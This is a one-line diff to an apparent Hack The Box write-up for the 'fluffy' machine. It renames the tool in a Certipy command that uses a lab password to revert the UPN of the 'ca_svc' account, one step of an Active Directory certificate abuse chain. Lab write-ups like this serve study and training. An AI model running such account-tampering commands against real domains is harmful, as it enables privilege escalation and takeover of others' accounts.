@@ -715,5 +715,5 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 ```
 Now revert back the UPN of ca_svc
 ```bash
-certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
 ```
